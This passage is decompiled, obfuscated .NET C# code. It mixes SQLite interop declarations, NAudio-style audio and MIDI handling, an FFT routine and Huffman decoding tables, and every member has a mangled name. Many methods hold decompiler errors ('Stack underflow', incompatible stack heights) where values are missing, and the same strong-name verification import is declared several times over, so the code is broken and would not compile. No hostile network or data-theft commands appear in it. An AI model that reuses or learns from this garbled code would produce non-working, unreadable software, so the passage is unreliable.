			_0007_0005._007E_0090_000E(_0006_0005._007E_008F_000E(dataTable), dataRow);
			global::_0008._007E_0013_0002(dataTable);
			global::_0008._007E_0012_0002(dataTable);
			return dataTable;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_sourceid")]
		static extern IntPtr _0001();

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_aggregate_context")]
		static extern IntPtr _0001(IntPtr _0002, int _0003);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(int _0002, global::_0001._007F P_1)
		{
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((global::_0001._007F)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_002d: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				new InvalidOperationException();
				throw /*Error near IL_0018: Stack underflow*/;
			}
			_0018._0001(P_1._0001, _0002);
		}

		static global::_0014._0004 _0001(Stream _0002)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			try
			{
				new global::_0014._0004((Stream)/*Error near IL_0010: Stack underflow*/);
				return (global::_0014._0004)/*Error near IL_0012: Stack underflow*/;
			}
			catch (FormatException)
			{
				return null;
			}
		}

		static int _0001(global::_0017._007F._0004 _0002, global::_0017._007F._0002 P_1)
		{
			//IL_0013: Invalid comparison between Unknown and I4
			//IL_00d7: Incompatible stack heights: 0 vs 1
			//IL_00dd: Incompatible stack heights: 0 vs 1
			//IL_00e3: Incompatible stack heights: 0 vs 1
			int num = _0018._0001((global::_0017._007F._0002)/*Error near IL_000c: Stack underflow*/, 9);
			int num2;
			if ((int)/*Error near IL_0018: Stack underflow*/ >= 0)
			{
				if ((num2 = ((global::_0017._007F._0004)/*Error near IL_0022: Stack underflow*/)._0001[num]) >= 0)
				{
					_0018._0001(P_1, num2 & 0xF);
					return num2 >> 4;
				}
				int num3 = -(num2 >> 4);
				int num4 = num2 & 0xF;
				if ((num = _0018._0001(P_1, num4)) >= 0)
				{
					num2 = _0002._0001[num3 | (num >> 9)];
					_0018._0001(P_1, num2 & 0xF);
					return num2 >> 4;
				}
				int num5 = P_1._0003;
				num = _0018._0001(P_1, num5);
				num2 = _0002._0001[num3 | (num >> 9)];
				if ((num2 & 0xF) <= num5)
				{
					_0018._0001(P_1, num2 & 0xF);
					return num2 >> 4;
				}
				return -1;
			}
			int num6 = P_1._0003;
			num = _0018._0001(P_1, num6);
			num2 = _0002._0001[num];
			if (num2 >= 0 && (num2 & 0xF) <= num6)
			{
				_0018._0001(P_1, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(_001D._0014 _0002, bool P_1)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				((_001D._0014)/*Error near IL_000c: Stack underflow*/)._0001 = _001D._0014._0001._0002;
			}
			else if (((_001D._0014)/*Error near IL_0014: Stack underflow*/)._0001 != 0)
			{
				_0002._0001 = _001D._0014._0001._0005;
			}
		}

		static global::_0010._0019 _0001()
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			new _001F._0015();
			_0018._0001((_001F._0015)/*Error near IL_0013: Stack underflow*/, global::_0016._0019._0001, _0019._0016._0002);
			return (global::_0010._0019)/*Error near IL_0007: Stack underflow*/;
		}

		static bool _0001(global::_000E._0008 P_0)
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			((global::_000E._0008)/*Error near IL_0007: Stack underflow*/)._0002._0001();
			if ((/*Error near IL_000b: Stack underflow*/ & 2) == 0)
			{
				return false;
			}
			return true;
		}

		static void _0001()
		{
			//IL_002b: Incompatible stack heights: 0 vs 2
			_ = _0091_0002._009C_0005;
			object obj = global::_0017._0084._0001;
			/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
			try
			{
				global::_0017._0084._0008 = null;
				global::_0017._0084._0001 = false;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		static void _0001(out long _0002, ref _001A._0007 _0003, global::_0017._0015 P_2)
		{
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._0015)/*Error near IL_0009: Stack underflow*/)._0001._0001;
			IntPtr pUnknown = ((global::_0017._0015)/*Error near IL_0015: Stack underflow*/)._0001;
			AsioError num = /*Error near IL_001c: Stack underflow*/(pUnknown, out _0002, ref _0003);
			string text = _0080._0014._0001(107354569);
			_0018._0001((global::_0017._0015)/*Error near IL_002b: Stack underflow*/, num, text);
		}

		static void _0001(global::_000E._0008 P_0)
		{
			//IL_02c7: Incompatible stack heights: 0 vs 1
			//IL_02d3: Incompatible stack heights: 0 vs 2
			object obj = ((global::_000E._0008)/*Error near IL_000a: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
			try
			{
				P_0._0001 = null;
				_0018._0001(ref P_0._0001, out P_0._0001, IntPtr.Zero);
				if (P_0._0001 != null)
				{
					P_0._0001._0001(_0018._0001(), global::_000E._0008._0003._0002);
					global::_000E._0008._0001 obj2 = new global::_000E._0008._0001();
					obj2._0001 = _0098._0089_0004(obj2);
					obj2._0001 = 0u;
					obj2._0001 = global::_000E._0008._0007._0001;
					obj2._0002 = 0;
					obj2._0001 = IntPtr.Zero;
					obj2._0001 = Guid.Empty;
					P_0._0001._0001(obj2, out var obj3, IntPtr.Zero);
					P_0._0001 = (global::_000E._0008._000F)obj3;
					P_0._0001._0001(0u, 0u, global::_000E._0008._0004._0001);
					P_0._0002 = _0018._0001(P_0._0004, P_0);
					global::_000E._0008._0001 obj4 = new global::_000E._0008._0001();
					obj4._0001 = _0098._0089_0004(obj4);
					obj4._0001 = (uint)(P_0._0002 * 2);
					obj4._0001 = global::_000E._0008._0007._0008 | global::_000E._0008._0007._000E | global::_000E._0008._0007._0010 | global::_000E._0008._0007._0011 | global::_000E._0008._0007._0012;
					obj4._0002 = 0;
					GCHandle gCHandle = _008E_0003._008A_0007(P_0._0001, GCHandleType.Pinned);
					obj4._0001 = gCHandle.AddrOfPinnedObject();
					obj4._0001 = Guid.Empty;
					P_0._0001._0001(obj4, out obj3, IntPtr.Zero);
					P_0._0002 = (global::_000E._0008._000F)obj3;
					gCHandle.Free();
					global::_000E._0008._0002 obj5 = new global::_000E._0008._0002();
					obj5._0001 = _0098._0089_0004(obj5);
					P_0._0002._0001(obj5);
					P_0._0003 = 0;
					P_0._0001 = obj5._0003;
					P_0._0001 = new byte[P_0._0001];
					global::_000E._0008._0010 obj6 = (global::_000E._0008._0010)obj3;
					P_0._0001 = new EventWaitHandle(initialState: false, EventResetMode.AutoReset);
					P_0._0002 = new EventWaitHandle(initialState: false, EventResetMode.AutoReset);
					P_0._0003 = new EventWaitHandle(initialState: false, EventResetMode.AutoReset);
					global::_000E._0008._0008[] array = new global::_000E._0008._0008[3]
					{
						default(global::_000E._0008._0008),
						default(global::_000E._0008._0008),
						default(global::_000E._0008._0008)
					};
					array[0]._0001 = 0u;
					array[0]._0001 = _0096_0002._007E_0006_0006(_0095_0002._007E_0005_0006(P_0._0001));
					array[1] = default(global::_000E._0008._0008);
					array[1]._0001 = (uint)P_0._0002;
					array[1]._0001 = _0096_0002._007E_0006_0006(_0095_0002._007E_0005_0006(P_0._0002));
					array[2] = default(global::_000E._0008._0008);
					array[2]._0001 = uint.MaxValue;
					array[2]._0001 = _0096_0002._007E_0006_0006(_0095_0002._007E_0005_0006(P_0._0003));
					obj6._0001(3u, array);
				}
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		static global::_000E._000E _0001()
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			new global::_000E._000E(_001B._0007._0002, IntPtr.Zero);
			return (global::_000E._000E)/*Error near IL_0009: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_overload_function")]
		static extern _0080._0017 _0001(IntPtr _0002, IntPtr _0003, int _0004);

		unsafe static void _0001(IntPtr _0002, IntPtr[] _0003, int _0004, int _0005)
		{
			//IL_005c: Incompatible stack heights: 0 vs 2
			//IL_0063: Incompatible stack heights: 0 vs 1
			_ = _0010_0005._0096_000E;
			/*Error near IL_0063: Stack underflow*/((IntPtr)/*Error near IL_0063: Stack underflow*/);
			short* ptr = (short*)/*Error near IL_0066: Stack underflow*/;
			short* ptr2 = (short*)_0010_0005._0096_000E(_0003[0]);
			short* ptr3 = (short*)_0010_0005._0096_000E(_0003[1]);
			ptr2++;
			ptr3++;
			for (int i = 0; i < _0005; i++)
			{
				*ptr2 = *ptr;
				*ptr3 = ptr[1];
				ptr += 2;
				ptr2 += 2;
				ptr3 += 2;
			}
		}

		static void _0001(long _0002, float[] _0003, long _0004, _001D._0015 P_3)
		{
			for (long num = 2L; num < 2 * _0002 - 2; num += 2)
			{
				long num2 = 2L;
				long num3 = 0L;
				while (num2 < 2 * _0002)
				{
					if ((num & num2) != 0L)
					{
						num3++;
					}
					num3 <<= 1;
					num2 <<= 1;
				}
				if (num < num3)
				{
					float num4 = _0003[num];
					_0003[num] = _0003[num3];
					_0003[num3] = num4;
					num4 = _0003[num + 1];
					_0003[num + 1] = _0003[num3 + 1];
					_0003[num3 + 1] = num4;
				}
			}
			long num5 = (long)(global::_0015._009D_0002(_0002) / global::_0015._009D_0002(2.0) + 0.5);
			long num6 = 0L;
			long num7 = 2L;
			for (; num6 < num5; num6++)
			{
				num7 <<= 1;
				long num8 = num7 >> 1;
				float num9 = 1f;
				float num10 = 0f;
				float num11 = (float)Math.PI / (float)(num8 >> 1);
				float num12 = (float)global::_0015._009A_0002(num11);
				float num13 = (float)((double)_0004 * global::_0015._009B_0002(num11));
				for (long num3 = 0L; num3 < num8; num3 += 2)
				{
					float num14;
					for (long num = num3; num < 2 * _0002; num += num7)
					{
						num14 = _0003[num + num8] * num9 - _0003[num + num8 + 1] * num10;
						float num15 = _0003[num + num8] * num10 + _0003[num + num8 + 1] * num9;
						_0003[num + num8] = _0003[num] - num14;
						_0003[num + num8 + 1] = _0003[num + 1] - num15;
						_0003[num] += num14;
						_0003[num + 1] += num15;
					}
					num14 = num9 * num12 - num10 * num13;
					num10 = num9 * num13 + num10 * num12;
					num9 = num14;
				}
			}
		}

		static bool _0001(MixerControlType _0002)
		{
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_0010: Invalid comparison between Unknown and I4
			//IL_0019: Invalid comparison between Unknown and I4
			//IL_005a: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 1
			//IL_0060: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0009: Stack underflow*/ <= 805634048)
			{
				if ((int)/*Error near IL_0012: Stack underflow*/ != 268632064 && (int)/*Error near IL_001b: Stack underflow*/ != 805502976 && _0002 != MixerControlType.Percent)
				{
					goto IL_0057;
				}
			}
			else
			{
				switch (_0002)
				{
				case MixerControlType.Fader:
				case MixerControlType.Volume:
				case MixerControlType.Bass:
				case MixerControlType.Treble:
				case MixerControlType.Equalizer:
				case MixerControlType.MicroTime:
				case MixerControlType.MilliTime:
					break;
				default:
					goto IL_0057;
				}
			}
			return true;
			IL_0057:
			return false;
		}

		unsafe static int _0001(int _0002, int _0003, global::_0016._0012 _0004, bool P_3)
		{
			//IL_0006: Invalid comparison between Unknown and I4
			//IL_001c: Invalid comparison between Unknown and I4
			//IL_023f: Incompatible stack heights: 0 vs 1
			//IL_0245: Incompatible stack heights: 0 vs 1
			//IL_024b: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0008: Stack underflow*/ >= 0)
			{
				int num = ((global::_0016._0012)/*Error near IL_0017: Stack underflow*/)._0001._0002;
				if ((int)/*Error near IL_001e: Stack underflow*/ <= num)
				{
					if (_0002 < 0 || _0002 > _0004._0001._0001)
					{
						throw new ArgumentException(_0080._0014._0001(107354495), _009D._0093_0004(_0080._0014._0001(107354434), _0002, _0004._0001._0001));
					}
					_0004._0001 = _0003;
					_0004._0002 = _0002;
					int num2 = _0004._0001._0001 + _0004._0001._0002;
					_0004._0001 = new global::_0014._000F[num2];
					_0004._0001 = new IntPtr[_0003];
					_0004._0002 = new IntPtr[_0002];
					int num3 = 0;
					int num4 = 0;
					while (num4 < _0004._0001._0001)
					{
						_0004._0001[num3]._0001 = true;
						_0004._0001[num3]._0001 = num4;
						_0004._0001[num3]._0001 = IntPtr.Zero;
						_0004._0001[num3]._0002 = IntPtr.Zero;
						num4++;
						num3++;
					}
					int num5 = 0;
					while (num5 < _0004._0001._0002)
					{
						_0004._0001[num3]._0001 = false;
						_0004._0001[num3]._0001 = num5;
						_0004._0001[num3]._0001 = IntPtr.Zero;
						_0004._0001[num3]._0002 = IntPtr.Zero;
						num5++;
						num3++;
					}
					if (P_3)
					{
						_0004._0003 = _0004._0001._0006;
					}
					else
					{
						_0004._0003 = _0004._0001._0007;
					}
					fixed (global::_0014._000F* value = &_0004._0001[0])
					{
						IntPtr intPtr = new IntPtr(value);
						global::_0017._0015 obj = _0004._0001;
						int num6 = _0004._0003;
						_0018._0001(intPtr, num6, obj, ref _0004._0001, num2);
					}
					_0004._0001 = _0018._0001(_0004._0001) == AsioError.ASE_OK;
					return _0004._0003;
				}
			}
			throw new ArgumentException(_009D._0093_0004(_0080._0014._0001(107354576), _0003, _0004._0001._0002));
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(BinaryWriter _0002, int _0003)
		{
			//IL_0006: Invalid comparison between Unknown and I4
			//IL_00a7: Incompatible stack heights: 0 vs 1
			//IL_00b1: Incompatible stack heights: 0 vs 1
			//IL_00b7: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0008: Stack underflow*/ < 0)
			{
				_0080._0014._0001(107388827);
				throw new ArgumentOutOfRangeException(actualValue: (int)/*Error near IL_001c: Stack underflow*/, message: _0080._0014._0001(107353833), paramName: (string?)/*Error near IL_002b: Stack underflow*/);
			}
			if (_0003 > 268435455)
			{
				throw new ArgumentOutOfRangeException(_0080._0014._0001(107388827), _0003, _0080._0014._0001(107353820));
			}
			int num = 0;
			byte[] array = new byte[4];
			do
			{
				array[num++] = (byte)((uint)_0003 & 0x7Fu);
				_0003 >>= 7;
			}
			while (_0003 > 0);
			while (num > 0)
			{
				num--;
				if (num > 0)
				{
					_0084_0003._007E_007F_0007(_0002, (byte)(array[num] | 0x80u));
				}
				else
				{
					_0084_0003._007E_007F_0007(_0002, array[num]);
				}
			}
		}

		static void _0001(int _0002, int _0003, global::_0001._0010 _0004, int P_3)
		{
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 2
			//IL_003c: Incompatible stack heights: 0 vs 2
			_ = ((global::_0001._0010)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = _0099._008E_0004;
			_0018._0001(_0018._0001(_0004: /*Error near IL_0015: Stack underflow*/((int)/*Error near IL_0015: Stack underflow*/), _0005: _0099._008E_0004(_0002), _0002: (IntPtr)/*Error near IL_0025: Stack underflow*/, _0003: (int)/*Error near IL_0025: Stack underflow*/), _0080._0014._0001(107353735));
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static IntPtr _0001(int _0002, int _0003)
		{
			IntPtr intPtr = IntPtr.Zero;
			IntPtr intPtr2 = IntPtr.Zero;
			IntPtr intPtr3 = IntPtr.Zero;
			IntPtr intPtr4 = IntPtr.Zero;
			IntPtr intPtr5 = IntPtr.Zero;
			try
			{
				_0018._0001(out int num, out int num2, out int num3, out int num4);
				if (num3 > 0 && num2 > 0 && num > 0 && num4 > 0)
				{
					intPtr2 = _0018._0001(num3);
					intPtr3 = _0018._0001(num2 * _0002);
					intPtr4 = _0018._0001(num * _0003);
					intPtr5 = _0018._0001(num4 * _0002);
					if (_0090_0002._0099_0005(intPtr2, IntPtr.Zero) && _0090_0002._0099_0005(intPtr3, IntPtr.Zero) && _0090_0002._0099_0005(intPtr4, IntPtr.Zero) && _0090_0002._0099_0005(intPtr5, IntPtr.Zero))
					{
						int num5 = 0;
						_0018._0001(num5, _0002, intPtr2);
						num5 = _0018._0001(num5, 4, _001B_0003._0097_0006());
						_0018._0001(num5, intPtr2, intPtr3);
						num5 = _0018._0001(num5, _001B_0003._0097_0006(), 4);
						_0018._0001(num5, _0003, intPtr2);
						num5 = _0018._0001(num5, 4, _001B_0003._0097_0006());
						_0018._0001(num5, intPtr2, intPtr4);
						num5 = _0018._0001(num5, _001B_0003._0097_0006(), _001B_0003._0097_0006());
						_0018._0001(num5, intPtr2, intPtr5);
						intPtr = intPtr2;
					}
				}
			}
			finally
			{
				if (_0090_0002._009A_0005(intPtr, IntPtr.Zero))
				{
					if (_0090_0002._0099_0005(intPtr5, IntPtr.Zero))
					{
						_0018._0001(intPtr5);
						intPtr5 = IntPtr.Zero;
					}
					if (_0090_0002._0099_0005(intPtr4, IntPtr.Zero))
					{
						_0018._0001(intPtr4);
						intPtr4 = IntPtr.Zero;
					}
					if (_0090_0002._0099_0005(intPtr3, IntPtr.Zero))
					{
						_0018._0001(intPtr3);
						intPtr3 = IntPtr.Zero;
					}
					if (_0090_0002._0099_0005(intPtr2, IntPtr.Zero))
					{
						_0018._0001(intPtr2);
						intPtr2 = IntPtr.Zero;
					}
				}
			}
			return intPtr;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_next_stmt")]
		static extern IntPtr _0001(IntPtr _0002, IntPtr _0003);

		static short _0001(_001F._0019 _0002, int P_1)
		{
			//IL_0094: Incompatible stack heights: 0 vs 1
			//IL_009a: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_00a4: Stack underflow*/, (int)/*Error near IL_00a4: Stack underflow*/);
			if (_0002._0001[P_1]._0001 != null)
			{
				return _0008_0006._007E_009B_000F(_0002._0001[P_1]._0001._0001, _0002._0001[P_1]._0004);
			}
			long num = _0002._0001._0001._0002(_0002._0001, _0002._0001[P_1]._0003);
			if (num == 0)
			{
				throw new InvalidCastException();
			}
			return _000E_0006._009C_000F(num);
		}

		static global::_0013._0010 _0001(BinaryReader _0002, global::_0013._0010 _0003)
		{
			//IL_01a9: Incompatible stack heights: 0 vs 1
			//IL_01b3: Incompatible stack heights: 0 vs 1
			_0018._0001((BinaryReader)/*Error near IL_01b3: Stack underflow*/);
			int num = default(int);
			if (0 == 0)
			{
				num = (int)/*Error near IL_01b9: Stack underflow*/;
			}
			int num2 = 1;
			byte b = _008D_0002._007E_0096_0005(_0002);
			MidiCommandCode midiCommandCode;
			if ((b & 0x80) == 0)
			{
				midiCommandCode = _0003._0001;
				num2 = _0003.Channel;
				_007F_0002 obj = _007F_0002._007E_0083_0005;
				Stream stream = _0005_0003._007E_0082_0006(_0002);
				long position = stream.Position;
				obj(stream, position - 1);
			}
			else if ((b & 0xF0) == 240)
			{
				midiCommandCode = (MidiCommandCode)b;
			}
			else
			{
				midiCommandCode = (MidiCommandCode)(b & 0xF0u);
				num2 = (b & 0xF) + 1;
			}
			global::_0013._0010 obj2;
			switch (midiCommandCode)
			{
			case MidiCommandCode.NoteOn:
				obj2 = new _007F._0010(_0002);
				break;
			case MidiCommandCode.NoteOff:
			case MidiCommandCode.KeyAfterTouch:
				obj2 = new global::_0013._0011(_0002);
				break;
			case MidiCommandCode.ControlChange:
				obj2 = new global::_0004._0010(_0002);
				break;
			case MidiCommandCode.PatchChange:
				obj2 = new global::_0007._0012(_0002);
				break;
			case MidiCommandCode.ChannelAfterTouch:
				obj2 = new _001C._0008(_0002);
				break;
			case MidiCommandCode.PitchWheelChange:
				obj2 = new _001C._000E(_0002);
				break;
			case MidiCommandCode.TimingClock:
			case MidiCommandCode.StartSequence:
			case MidiCommandCode.ContinueSequence:
			case MidiCommandCode.StopSequence:
				obj2 = new global::_0013._0010();
				break;
			case MidiCommandCode.Sysex:
				obj2 = _0018._0001(_0002);
				break;
			case MidiCommandCode.MetaEvent:
				obj2 = _0018._0001(_0002);
				break;
			default:
				throw new FormatException(_0008_0002._0007_0005(_0080._0014._0001(107353746), (byte)midiCommandCode));
			}
			obj2._0001 = num2;
			obj2._0002 = num;
			obj2._0001 = midiCommandCode;
			return obj2;
		}

		static void _0001(byte[] _0002, global::_0017._007F._0004 P_1)
		{
			int[] array = new int[16];
			int[] array2 = new int[16];
			foreach (int num in _0002)
			{
				if (num > 0)
				{
					array[num]++;
				}
			}
			int num2 = 0;
			int num3 = 512;
			for (int j = 1; j <= 15; j++)
			{
				array2[j] = num2;
				num2 += array[j] << 16 - j;
				if (j >= 10)
				{
					int num4 = array2[j] & 0x1FF80;
					int num5 = num2 & 0x1FF80;
					num3 += num5 - num4 >> 16 - j;
				}
			}
			P_1._0001 = new short[num3];
			int num6 = 512;
			for (int num7 = 15; num7 >= 10; num7--)
			{
				int num8 = num2 & 0x1FF80;
				num2 -= array[num7] << 16 - num7;
				for (int k = num2 & 0x1FF80; k < num8; k += 128)
				{
					P_1._0001[_0018._0001(k)] = (short)((-num6 << 4) | num7);
					num6 += 1 << num7 - 9;
				}
			}
			for (int l = 0; l < _0002.Length; l++)
			{
				int num9 = _0002[l];
				if (num9 == 0)
				{
					continue;
				}
				num2 = array2[num9];
				int num10 = _0018._0001(num2);
				if (num9 <= 9)
				{
					do
					{
						P_1._0001[num10] = (short)((l << 4) | num9);
						num10 += 1 << num9;
					}
					while (num10 < 512);
				}
				else
				{
					int num11 = P_1._0001[num10 & 0x1FF];
					int num12 = 1 << (num11 & 0xF);
					num11 = -(num11 >> 4);
					do
					{
						P_1._0001[num11 | (num10 >> 9)] = (short)((l << 4) | num9);
						num10 += 1 << num9;
					}
					while (num10 < num12);
				}
				array2[num9] = num2 + (1 << 16 - num9);
			}
		}

		unsafe static void _0001(_001B._0018 _0002, ref bool _0003, [Out] _0014 _0004, int P_3)
		{
			//IL_00a5: Incompatible stack heights: 0 vs 1
			//IL_00ab: Incompatible stack heights: 0 vs 1
			*(sbyte*)(nint)/*Error near IL_0007: Stack underflow*/ = 0;
			SQLiteConnectionFlags flags = ((_0014)/*Error near IL_0011: Stack underflow*/)._0001;
			_0004._0001 &= ~SQLiteConnectionFlags.UseConnectionReadValueCallbacks;
			try
			{
				string text = _009E_0003._007E_0003_0008(_0004, P_3);
				if (text == null)
				{
					return;
				}
				global::_0017._0080 obj = _0018._0001(_0004);
				global::_0007._001A obj2 = default(global::_0007._001A);
				if (obj != null && _0018._0001(obj, text, ref obj2) && obj2 != null)
				{
					global::_0003._0015 obj3 = obj2._0001;
					if (obj3 != null)
					{
						object userData = obj2._0002;
						obj3(_0004._0001._0001, _0004, flags, _0002, text, P_3, userData, out _0003);
					}
				}
			}
			finally
			{
				_0004._0001 |= SQLiteConnectionFlags.UseConnectionReadValueCallbacks;
			}
		}

		static void _0001(global::_0004._0008 _0002, float P_1)
		{
			//IL_010f: Incompatible stack heights: 0 vs 1
			//IL_0115: Incompatible stack heights: 0 vs 2
			//IL_011b: Incompatible stack heights: 0 vs 2
			if (((global::_0004._0008)/*Error near IL_000a: Stack underflow*/)._0001._0003 == 16)
			{
				_ = _009F_0002._007E_001C_0006;
				_ = ((global::_0004._0008)/*Error near IL_0022: Stack underflow*/)._0001;
				byte[] array = _0018._0001((global::_0004._0008)/*Error near IL_0034: Stack underflow*/, (short)(32767f * P_1));
				/*Error near IL_0039: Stack underflow*/((object)/*Error near IL_0039: Stack underflow*/, array);
				_0002._0001 += 2;
			}
			else if (_0002._0001._0003 == 24)
			{
				byte[] array2 = _0012_0003._008E_0006((int)(2.1474836E+09f * P_1));
				_0002._0001[2] = array2[1];
				_0002._0001[1] = array2[2];
				_0002._0001[0] = array2[3];
				_009F_0002._007E_001C_0006(_0002._0001, _0002._0001);
				_0002._0001 += 3;
			}
			else
			{
				if (_0002._0001._0003 != 32 || _0002._0001._0001 != WaveFormatEncoding.Extensible)
				{
					throw new InvalidOperationException(_0080._0014._0001(107355392));
				}
				_009F_0002._007E_001C_0006(_0002._0001, _0018._0001(65535 * (int)P_1, _0002));
				_0002._0001 += 4;
			}
		}

		static void _0001(DateTime _0002, int _0003, global::_0001._001F _0004)
		{
			//IL_005d: Incompatible stack heights: 0 vs 1
			//IL_0064: Incompatible stack heights: 0 vs 1
			global::_0001._001F._0001((global::_0001._001F)/*Error near IL_0064: Stack underflow*/);
			IntPtr intPtr;
			if (2u != 0)
			{
				intPtr = (IntPtr)/*Error near IL_0067: Stack underflow*/;
			}
			_0018._0001(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107355831), new object[4]
			{
				intPtr,
				_0003,
				_0091._0080_0004(typeof(DateTime).TypeHandle),
				_0018._0001(_0002)
			}));
		}

		static global::_0007._001A _0001(object _0002, _0080._0015 _0003, object _0004, global::_0003._0015 _0005)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			return new global::_0007._001A((_0080._0015)/*Error near IL_000c: Stack underflow*/, (global::_0003._0015)/*Error near IL_000c: Stack underflow*/, (object)/*Error near IL_000c: Stack underflow*/, _0004);
		}

		static bool _0001(bool _0002, global::_0003._0016 P_1)
		{
			//IL_00b8: Incompatible stack heights: 0 vs 1
			//IL_00be: Incompatible stack heights: 0 vs 1
			//IL_00c8: Incompatible stack heights: 0 vs 1
			if (((global::_0003._0016)/*Error near IL_000a: Stack underflow*/)._0001 == null)
			{
				if ((int)/*Error near IL_0013: Stack underflow*/ != 0)
				{
					_0080._0014._0001(107353665);
					throw new ArgumentNullException((string?)/*Error near IL_0022: Stack underflow*/);
				}
				return false;
			}
			if (P_1._0001._0017 != P_1._0001)
			{
				if (_0002)
				{
					throw new SQLiteException(_0080._0014._0001(107353600));
				}
				return false;
			}
			if (_000F_0006._007E_009D_000F(P_1._0001) != ConnectionState.Open)
			{
				if (_0002)
				{
					throw new SQLiteException(_0080._0014._0001(107354043));
				}
				return false;
			}
			if (P_1._0001._0011 == 0 || P_1._0001._0001.AutoCommit)
			{
				P_1._0001._0011 = 0;
				if (_0002)
				{
					throw new SQLiteException(_0080._0014._0001(107354014));
				}
				return false;
			}
			return true;
		}

		static void _0001(global::_0002._0019 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0002._0019)/*Error near IL_0007: Stack underflow*/)._0003)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0002._0019).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static object _0001(DbType _0002)
		{
			//IL_000a: Incompatible stack heights: 0 vs 2
			_ = global::_0001._001A._0001;
			return ((object[])/*Error near IL_0008: Stack underflow*/)[/*Error near IL_0008: Stack underflow*/];
		}

		static double _0001(double _0002)
		{
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Expected F8, but got Unknown
			//IL_0015: Incompatible stack heights: 0 vs 2
			//IL_001c: Incompatible stack heights: 0 vs 1
			_ = global::_0015._009D_0002;
			/*Error near IL_001c: Stack underflow*/((double)/*Error near IL_001c: Stack underflow*/);
			return /*Error near IL_0013: Stack underflow*/* 8.685889638065037;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

